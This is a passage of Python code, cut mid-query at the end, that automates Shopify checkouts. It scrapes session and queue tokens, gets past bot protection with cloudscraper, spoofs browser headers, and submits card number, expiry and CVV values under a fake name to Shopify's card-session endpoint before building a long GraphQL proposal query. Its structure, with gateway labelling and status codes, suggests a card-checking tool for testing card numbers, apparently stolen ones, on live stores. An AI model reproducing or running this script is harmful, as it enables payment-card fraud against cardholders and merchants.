                                currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                            if not countryCode:
                                countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"') or currencyCode
                            if not web_build or not str(web_build).strip():
                                match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
                                if match:
                                    web_build = match.group(1)
                        except Exception:
                            pass
                        logger.info(f"Checkout tokens via cloudscraper retry for {url}")
                except Exception:
                    pass

            missing = []
            if not x_checkout_one_session_token:
                missing.append("session_token")
            if not token:
                missing.append("source_token")
            if not queue_token:
                missing.append("queue_token")
            if not stable_id:
                missing.append("stable_id")
            if missing:
                output.update({
                    "Response": f"CHECKOUT_TOKENS_MISSING ({','.join(missing)})",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output

        try:
            tax1 = capture(checkout_text, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot")
        except Exception:
            tax1 = None
        try:
            gateway = _capture_multi(checkout_text, ('extensibilityDisplayName&quot;:&quot;', '&quot'), ('extensibilityDisplayName":"', '"')) or capture(checkout_text, 'extensibilityDisplayName&quot;:&quot;', '&quot')
        except Exception:
            gateway = None
        if gateway == "Shopify Payments":
            gateway = "Normal"
        elif gateway:
            gateway = gateway
        else:
            gateway = "Unknown"
        DMT = capture(checkout_text, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;')

        addr = pick_addr(url, cc=currencyCode, rc=countryCode)
        # print(addr["postalCode"])
        # print(addr["address1"])
        # print(addr["city"])
        # print(addr["zoneCode"])
        # print(addr["phone"])
        # print(addr["countryCode"])
        # print(addr["currencyCode"])

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'priority': 'u=1, i',
            'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'sec-gpc': '1',
            'user-agent': f'{getua}',
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mes,
                'year': ano,
                'verification_value': cvv,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': 'maxine df',
            },
            'payment_session_scope': domain,
        }

        # Removed tokenization - using bulletproof session
        request = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, timeout=18)
        
        # Parse session response with error handling
        if not request or not hasattr(request, 'json'):
            output.update({
                "Response": "SESSION_NO_RESPONSE",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        
        try:
            session_response = request.json()
            if not session_response or not isinstance(session_response, dict):
                output.update({
                    "Response": "SESSION_INVALID_JSON",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output
            
            if "id" not in session_response:
                # Check for error messages
                if "error" in session_response or "message" in session_response:
                    error_msg = session_response.get("message") or session_response.get("error", "SESSION_ERROR")
                    output.update({
                        "Response": f"SESSION_ERROR: {str(error_msg)[:50]}",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output
                output.update({
                    "Response": "SESSION_ID_MISSING",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output
            sessionid = session_response["id"]
        except json.JSONDecodeError:
            output.update({
                "Response": "SESSION_INVALID_JSON",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        # print(f"PAY ID{paymentMethodIdentifier}\nSTABLE ID{stable_id}\nQUTTA TOKEN{queue_token}\nXcheckout :{x_checkout_one_session_token}\ntoken {token}\nmc build{web_build}\nsusion id{sessionid}\nCurrency Code: {currencyCode}\nCountry Code:{countryCode}\nRaw Tax: {tax1}\nGate: {gateway}")

        headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-IN',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': f'{mobile}',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': f'{getua}',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': token,
        }

        params = {
            'operationName': 'Proposal'
        }

        json_data = {
            'query': 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,cartMetafields:$cartMetafields,memberships:$memberships},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename reportable}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on 